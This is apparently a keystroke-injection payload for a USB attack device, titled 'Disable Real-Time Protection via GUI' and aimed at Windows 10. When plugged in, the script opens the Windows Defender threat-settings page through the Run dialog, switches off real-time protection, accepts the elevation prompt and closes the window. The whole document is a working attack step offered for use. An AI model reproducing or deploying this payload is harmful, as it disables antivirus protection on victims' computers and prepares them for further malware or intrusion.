// =============================================================================
// Title: Disable Real-Time Protection via GUI
// Author: @beigeworm | https://github.com/beigeworm
// Description: Disable Real-Time Protection via the Windows Defender GUI.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// startup

// =============================================================================

// Script Setup
layout('us'); 
// typingSpeed(1,1);

// Main Payload
delay(1000);
press("GUI r");
delay(2500);
type("windowsdefender://threatsettings");
delay(500);
press("ENTER");
delay(5000);
press("SPACE");
delay(2000);
press("ALT y");
delay(3000);
press("ALT F4");
